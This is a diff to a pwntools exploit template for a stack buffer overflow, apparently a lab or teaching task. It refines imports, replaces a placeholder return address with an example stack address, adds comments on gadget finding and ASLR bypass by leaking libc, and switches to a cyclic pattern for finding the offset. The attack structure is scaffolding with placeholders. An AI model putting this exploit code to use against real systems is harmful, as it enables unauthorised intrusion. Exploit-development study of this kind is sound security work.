@@ -10,9 +10,9 @@ Author: Example
 License: MSF_LICENSE
 """
 
-from pwn import *
 import os
 import sys
+from pwn import context, log, remote, ELF, gdb, asm, shellcraft, p64, cyclic, cyclic_find
 
 # Configure pwntools context
 context.update(arch='amd64', os='linux', log_level='info')
@@ -172,10 +172,11 @@ class BufferOverflowTask:
             
             # 2. Return address (would be gadget address or shellcode location)
             # In a real exploit, this would be calculated based on:
-            # - Target binary analysis
-            # - Memory layout
-            # - ASLR bypass if needed
-            ret_addr = 0xdeadbeef  # Placeholder
+            # - Target binary analysis (use ELF class to find gadgets)
+            # - Memory layout (may need leak or bruteforce)
+            # - ASLR bypass if needed (leak libc address)
+            # For demonstration, using a placeholder - replace with actual address from analysis
+            ret_addr = 0x00007fffffffe000  # Example stack address - would be from actual analysis
             buffer += p64(ret_addr)  # Pack as 64-bit little-endian
             
             # 3. Shellcode
@@ -239,9 +240,11 @@ class BufferOverflowTask:
         ''')
         
         # Build and send a test payload
-        payload = b'A' * 256 + p64(0xdeadbeef)
-        log.info(f"Sending test payload ({len(payload)} bytes)")
-        io.send(payload)
+        # Use cyclic pattern to find exact offset during debugging
+        test_pattern = cyclic(300)
+        log.info(f"Sending cyclic pattern ({len(test_pattern)} bytes)")
+        log.info("Use 'cyclic_find(value)' in GDB to find the offset")
+        io.send(test_pattern)
         io.send(b'\n')
         
         # Drop to interactive mode
